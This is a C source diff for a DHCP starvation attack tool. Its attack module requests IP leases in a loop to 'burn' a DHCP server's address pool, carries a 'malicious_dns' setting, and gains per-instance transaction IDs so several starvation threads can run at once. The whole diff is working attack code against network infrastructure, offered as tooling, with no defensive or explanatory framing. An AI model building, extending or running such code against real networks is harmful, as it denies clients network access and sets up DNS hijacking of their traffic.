@@ -7,8 +7,11 @@
 
 #include <string.h>
 #include <unistd.h>
+#include <stdio.h>
 
 #define DESCRIPTION_INSTANCE "attack algorithm"
+
+size_t instances = 0;
 
 struct attack_s {
     logger_t logger;
@@ -18,6 +21,7 @@ struct attack_s {
     char interface_name[LENGTH_INTERFACE_NAME];
     dhcp_client_t dhcp_client;
     size_t burned_ips;
+    uint32_t transaction;
 };
 
 static void _build_dhcp_client(attack_t instance, attack_args_t args);
@@ -40,7 +44,7 @@ int attack_create(attack_t *instance, attack_args_t args) {
 int attack_run(attack_t instance) {
     logger_info(instance->logger, "Running attack");
 
-    dhcp_client_discovery(instance->dhcp_client, instance->mac, instance->my_ip);
+    dhcp_client_discovery(instance->dhcp_client, instance->mac, instance->my_ip, instance->transaction);
     return ATTACK_E_SUCCESSFUL;
 }
 
@@ -67,43 +71,51 @@ static void _build_dhcp_client(attack_t instance, attack_args_t args) {
 }
 
 static void _build_logger(attack_t instance, attack_args_t args) {
-    logger_create(&(instance->logger), "attack-algorithm", CONSTANT_LOG_LEVEL);
+    char logger_name[32];
+    sprintf(logger_name, "starvation-thread-%d", ++instances);
+    logger_create(&(instance->logger), logger_name, CONSTANT_LOG_LEVEL);
 }
 
 static void _extract_fields(attack_t instance, attack_args_t args) {
     instance->malicious_dns = args.malicious_dns;
     instance->my_ip = args.my_ip;
     instance->burned_ips = 5;
+    instance->transaction = random();
     strcpy(instance->interface_name, args.interface_name);
     memcpy(instance->mac, args.mac, sizeof(instance->mac));
 }
 
 static void _on_ack_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_ack_data_t data) {
     attack_t instance = args;
-    logger_debug(instance->logger, "Just received a DHCP ACK");
+    if (data.xid == instance->transaction) {
+        logger_debug(instance->logger, "Just received a DHCP ACK");
 
-    dhcp_client_decline_data_t decline_data = {
-        .ack_data = data
-    };
+        dhcp_client_decline_data_t decline_data = {
+                .ack_data = data
+        };
 
-    memcpy(decline_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
+        memcpy(decline_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
 
-    logger_debug(instance->logger, "Burning another IP...");
-    //dhcp_client_decline(dhcp_client, decline_data);
-    dhcp_client_discovery(dhcp_client, instance->mac, instance->my_ip);
+        logger_debug(instance->logger, "Burning another IP...");
+        //dhcp_client_decline(dhcp_client, decline_data);
+        dhcp_client_discovery(dhcp_client, instance->mac, instance->my_ip, ++(instance->transaction));
+    }
 }
 
 static void _on_offer_callback(dhcp_client_t dhcp_client, void *args, dhcp_client_offer_data_t data) {
     attack_t instance = args;
-    _log_offer(instance, data);
 
-    dhcp_client_request_data_t request_data = {
-        .mac = NULL,
-        .offer_data = data
-    };
-    memcpy(request_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
+    if (data.xid == instance->transaction) {
+        _log_offer(instance, data);
 
-    dhcp_client_request(dhcp_client, request_data);
+        dhcp_client_request_data_t request_data = {
+            .mac = NULL,
+            .offer_data = data
+        };
+        memcpy(request_data.mac, instance->mac, LENGTH_MAC_ADDRESS_AS_BYTES);
+
+        dhcp_client_request(dhcp_client, request_data);
+    }
 }
 
 static void _log_offer(attack_t instance, dhcp_client_offer_data_t offer) {
